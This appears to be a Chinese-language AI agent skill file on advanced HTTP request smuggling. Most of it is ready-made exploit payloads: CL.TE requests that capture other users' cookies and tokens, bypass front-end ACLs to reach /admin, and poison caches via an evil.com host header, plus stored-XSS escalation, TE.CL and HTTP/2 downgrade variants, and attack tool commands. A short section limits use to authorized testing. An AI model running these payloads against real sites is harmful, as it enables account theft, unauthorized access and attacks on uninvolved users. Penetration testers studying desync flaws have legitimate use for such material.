---
name: http-smuggling-advanced
description: "HTTP 请求走私高级利用方法论。扩展 cache-poisoning-smuggling 的走私部分。当已确认存在 CL.TE/TE.CL/TE.TE/H2.CL 走私时使用。覆盖链式利用（窃取凭据、绕过 ACL、投毒 Web 缓存、XSS 其他用户）和 HTTP/2 降级走私"
metadata:
  tags: "http smuggling,request smuggling,desync,cl-te,te-cl,h2-smuggling,http2,降级走私,请求走私"
  category: "exploit"
  mitre_attack: "T1190,T1557"
---

# HTTP 请求走私高级利用

> **前置**: 本 skill 专注于**确认走私漏洞后的链式利用**

## ⛔ 深入参考

- 各类走私变体检测 payload → [references/smuggling-detection.md](references/smuggling-detection.md)
- H2C/H2 降级走私技术 → [references/h2-smuggling.md](references/h2-smuggling.md)

---

## Phase 0: 走私类型速查

```
前端(FE) 用什么解析请求长度？后端(BE) 用什么？

CL.TE: FE 用 Content-Length → BE 用 Transfer-Encoding
TE.CL: FE 用 Transfer-Encoding → BE 用 Content-Length
TE.TE: 两者都用 TE，但对畸形 TE 头处理不一致
H2.CL: FE 用 HTTP/2 帧长度 → BE 降级到 HTTP/1.1 用 CL
H2.TE: FE 用 HTTP/2 → BE 降级后用 TE

⛔ 确认走私存在后才进入本 skill 的利用阶段
```

## Phase 1: CL.TE 走私利用

### 1.1 窃取其他用户请求

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: target.com
Content-Length: 500
Content-Type: application/x-www-form-urlencoded

stolen=
```

**原理：** 后端将 `POST /log ... stolen=` 当作下一个请求的前缀 → 下一个用户的完整请求被拼接到 `stolen=` 后面 → 你可以读取他们的 Cookie/Token

### 1.2 绕过前端 ACL

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 73
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1

```

**原理：** 前端只检查第一个请求（POST /）→ 放行。被走私的 `GET /admin` 直接到达后端 → 绕过前端的 IP/路径限制。

### 1.3 投毒 Web 缓存

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 120
Transfer-Encoding: chunked

0

GET /static/main.js HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

```

**原理：** 走私的 GET 请求 + 恶意 Host 头 → 后端返回包含 `evil.com` 的响应 → 前端缓存此响应 → 其他用户访问 `/static/main.js` 获取到被投毒的内容。

### 1.4 反射 XSS 升级为存储 XSS

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1
Host: target.com
X-Random: x
```

**原理：** 如果 `/search` 有反射 XSS → 走私请求让下一个用户的响应变成包含 XSS payload 的搜索结果页 → 反射变存储。

## Phase 2: TE.CL 走私利用

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

78
POST /admin HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

**关键：** 前端根据 TE 正确读取全部 chunked 数据。后端根据 CL=4 只读 `78\r\n`，剩余的 `POST /admin ...` 被当作独立新请求。

## Phase 3: HTTP/2 降级走私 (H2.CL / H2.TE)

### 3.1 H2.CL 走私

```
HTTP/2 请求（前端）：
:method: POST
:path: /
:authority: target.com
content-length: 0

走私的 HTTP/1.1（后端看到的）：
POST / HTTP/1.1\r\n
Host: target.com\r\n
Content-Length: 0\r\n
\r\n
GET /admin HTTP/1.1\r\n
Host: target.com\r\n
\r\n
```

**原理：** HTTP/2 用帧长度，不需要 CL。但降级到 HTTP/1.1 时，错误的 CL 值使后端将多余数据当作新请求。

### 3.2 H2 Request Tunneling

```
利用 HTTP/2 HEADERS 帧的特殊头：
:method: POST
:path: /
:authority: target.com
transfer-encoding: chunked

在 HTTP/2 中 TE 头通常被忽略，但降级后生效
→ 可构造 CL 与 TE 不一致的情况
```

## Phase 4: 自动化检测与利用

### 工具

```bash
# smuggler.py — 自动化检测
python3 smuggler.py -u https://target.com

# Burp Suite — HTTP Request Smuggler 扩展
# 安装扩展 → Scan → 报告走私类型

# h2csmuggler — HTTP/2 明文升级走私
python3 h2csmuggler.py -x https://target.com -t /admin

# 手动 curl 验证（CL.TE）
curl -i -X POST https://target.com/ \
  -H "Content-Length: 6" \
  -H "Transfer-Encoding: chunked" \
  --data-binary $'0\r\n\r\nG'
# 如果第二次正常 GET 返回 "GGET / HTTP/1.1 ..." 405 → 存在走私
```

### 验证走私成功的方法

```
方法 1: 时间差异
├─ 走私一个有延迟的请求 → 观察响应时间变化

方法 2: 差异响应
├─ 走私 GET /404path → 下一个正常请求返回 404

方法 3: 反射请求
├─ 走私请求到自己控制的日志服务器
├─ 观察是否收到其他用户的请求

方法 4: OAST（Out-of-band）
├─ 走私 Host: burp-collaborator.net
├─ 检查 Collaborator 收到的 DNS/HTTP 请求
```

## ⛔ 风险控制

- 请求走私**会影响其他用户** → 仅在授权测试中使用
- 测试时使用唯一标识符区分你的请求
- 先用时间差异法确认 → 再进行利用
- 避免大量走私请求导致服务不可用

